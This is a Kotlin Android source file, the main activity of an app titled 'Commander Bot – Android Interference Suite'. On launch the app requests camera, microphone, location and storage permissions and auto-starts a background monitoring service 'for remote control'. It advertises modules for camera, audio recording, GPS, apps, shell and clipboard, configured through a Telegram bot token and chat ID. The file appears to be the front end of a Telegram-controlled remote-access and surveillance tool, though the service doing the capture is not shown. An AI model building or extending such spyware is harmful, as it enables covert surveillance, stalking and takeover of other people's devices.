package com.example.telegramlistener.ui

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import com.example.telegramlistener.data.repo.EventRepository
import com.example.telegramlistener.service.MonitorService
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    @Inject
    lateinit var repository: EventRepository

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        // Simple callback
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Request perms on start
        requestPermissions()

        // Auto-start service for testing/remote control
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        setContent {
            MaterialTheme {
                Surface(modifier = Modifier.fillMaxSize()) {
                    MainScreen()
                }
            }
        }
    }

    private fun requestPermissions() {
        val perms = mutableListOf(
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.READ_EXTERNAL_STORAGE
        ).apply {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(android.Manifest.permission.POST_NOTIFICATIONS)
            }
        }
        permissionLauncher.launch(perms.toTypedArray())
    }

    @Composable
    fun MainScreen() {
        var botToken by remember { mutableStateOf("") }
        var chatId by remember { mutableStateOf("") }
        val scope = rememberCoroutineScope()
        var status by remember { mutableStateOf("Initializing...") }
        var isServiceRunning by remember { mutableStateOf(false) }
        var isBroadcastAvailable by remember { mutableStateOf(false) }
        var isConfigExpanded by remember { mutableStateOf(false) }

        LaunchedEffect(Unit) {
            val (token, chat) = repository.getConfig()
            botToken = token
            chatId = chat
            
            // Observe Service State from Repository
            repository.getServiceRunning().collect { running ->
                isServiceRunning = running
                isBroadcastAvailable = isServiceRunning && botToken.isNotEmpty()
                status = if (isBroadcastAvailable) "🟢 Broadcast Available" else "🔴 Service Offline"
            }
        }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp),
            horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text(
                "🤖 Commander Bot",
                style = MaterialTheme.typography.headlineLarge,
                color = MaterialTheme.colorScheme.primary
            )
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                "Android Interference Suite",
                style = MaterialTheme.typography.bodyLarge,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )

            Spacer(modifier = Modifier.height(32.dp))

            // Status Indicator Button
            Button(
                onClick = { 
                    Toast.makeText(applicationContext, "Status: $status", Toast.LENGTH_SHORT).show()
                    val vibrator = getSystemService(android.content.Context.VIBRATOR_SERVICE) as android.os.Vibrator
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(android.os.VibrationEffect.createOneShot(50, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        vibrator.vibrate(50)
                    }
                },
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (isBroadcastAvailable) androidx.compose.ui.graphics.Color.Green else androidx.compose.ui.graphics.Color.Red,
                    contentColor = androidx.compose.ui.graphics.Color.White
                ),
                modifier = Modifier
                    .fillMaxWidth()
                    .height(56.dp)
            ) {
                Text(
                    text = status.uppercase(),
                    style = MaterialTheme.typography.titleMedium
                )
            }
            
            Spacer(modifier = Modifier.height(24.dp))
            
            // Integrated Suite Info
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("📦 Integrated Modules:", style = MaterialTheme.typography.titleSmall)
                    Text("• Camera (Front/Back) ✅")
                    Text("• Microphone (Audio Record) ✅")
                    Text("• Location (GPS/Net) ✅")
                    Text("• System (Apps, Shell, Clipboard) ✅")
                }
            }

            Spacer(modifier = Modifier.height(24.dp))

            // Control Buttons
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                Button(
                    onClick = {
                        val intent = Intent(applicationContext, MonitorService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(intent)
                        } else {
                            startService(intent)
                        }
                        Toast.makeText(applicationContext, "Starting Service...", Toast.LENGTH_SHORT).show()
                    },
                    modifier = Modifier.weight(1f).padding(end = 8.dp)
                ) {
                    Text("Start Service")
                }

                Button(
                    onClick = {
                        stopService(Intent(applicationContext, MonitorService::class.java))
                        Toast.makeText(applicationContext, "Stopping Service...", Toast.LENGTH_SHORT).show()
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
                    modifier = Modifier.weight(1f).padding(start = 8.dp)
                ) {
                    Text("Stop Service")
                }
            }

            Spacer(modifier = Modifier.height(32.dp))

            TextButton(onClick = { isConfigExpanded = !isConfigExpanded }) {
                Text(if (isConfigExpanded) "Hide Configuration 🔼" else "Show Configuration 🔽")
            }

            if (isConfigExpanded) {
                OutlinedTextField(
                    value = botToken,
                    onValueChange = { botToken = it },
                    label = { Text("Bot Token") },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedTextField(
                    value = chatId,
                    onValueChange = { chatId = it },
                    label = { Text("Chat ID") },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )
                Spacer(modifier = Modifier.height(16.dp))
                Row {
                     Button(
                        onClick = {
                            scope.launch {
                                val id = repository.getChatId(botToken)
                                if (id != null) {
                                    chatId = id
                                    Toast.makeText(applicationContext, "Found ID: $id", Toast.LENGTH_SHORT).show()
                                } else {
                                    Toast.makeText(applicationContext, "ID Check Failed", Toast.LENGTH_SHORT).show()
                                }
                            }
                        },
                        modifier = Modifier.weight(1f).padding(end = 4.dp)
                    ) {
                        Text("Auto-Detect ID")
                    }
                    Button(
                        onClick = {
                            repository.saveConfig(botToken, chatId)
                            Toast.makeText(applicationContext, "Config Saved", Toast.LENGTH_SHORT).show()
                            isConfigExpanded = false
                        },
                        modifier = Modifier.weight(1f).padding(start = 4.dp)
                    ) {
                        Text("Save")
                    }
                }
            }
        }
    }
    
    @Suppress("DEPRECATION")
    private fun isServiceRunning(context: android.content.Context, serviceClass: Class<*>): Boolean {
        val manager = context.getSystemService(android.content.Context.ACTIVITY_SERVICE) as android.app.ActivityManager?
        for (service in manager?.getRunningServices(Integer.MAX_VALUE) ?: emptyList()) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }
}

